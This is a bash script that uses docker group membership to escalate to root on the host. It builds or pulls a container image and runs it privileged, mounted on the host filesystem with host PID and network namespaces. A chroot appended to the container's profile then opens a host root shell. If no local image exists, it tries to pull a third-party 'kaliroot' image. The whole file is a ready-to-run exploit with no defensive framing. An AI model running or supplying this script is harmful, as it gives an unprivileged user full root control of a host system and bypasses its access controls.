#!/bin/bash

if ! id | grep -q docker; then echo "$LOGNAME is not a member of the docker group."; exit; fi
if ! docker images >/dev/null 2>&1; then echo "$LOGNAME does not have access to the docker daemon."; exit; fi

commit_abuse() {
  read -r -d '' DOCKERFILE <<EOF
FROM $IMAGE
RUN echo "\$(which chroot) /host /bin/sh" >> /root/.profile
ENTRYPOINT ["/bin/sh", "-l"]
EOF
  echo "$DOCKERFILE" > Dockerfile
  docker rmi rootshell >/dev/null 2>&1
  docker build -t rootshell .
  docker run --rm --privileged --pid=host --net=host -itv /:/host rootshell
  docker rmi rootshell
  rm -f Dockerfile
}

if [[ $(docker images | wc -l) -eq 1 ]]; then
  registry="$(docker info 2>/dev/null | grep Registry | awk -F ': ' '{print $NF}' | sed "s@https://@@" | cut -d'/' -f1)"
  if (echo -n >/dev/tcp/"$registry"/443) >/dev/null 2>&1; then
    echo 'no local images. trying to pull kali image from the registry...'
    if docker run --rm --privileged --pid=host --net=host -itv /:/host lphxl/kaliroot; then
      docker rmi kaliroot
      exit
    else
      echo 'no access to dockerhub registry. going to try to pull a poplular image from the current registry'
      declare -a images=("ubuntu" "debian" "centos" "alpine" "nginx" "python" "mysql" "tomcat" "node" "mongodb" "httpd" "maven" "jenkins")
      for IMAGE in "${images[@]}"; do
        if docker pull "$IMAGE" > /dev/null 2>&1; then
          commit_abuse
          exit
        fi
      done
      echo 'sorry, no luck. please try an alternate method of privilege escalation.'
      exit
    fi
  fi
else
  local_images="$(docker images | awk '{print $1}' | awk 'NR>1')"
  echo -e "\n${local_images}\n"
  read -r -p 'Please type the name of the image you want to use: ' IMAGE
  commit_abuse
fi

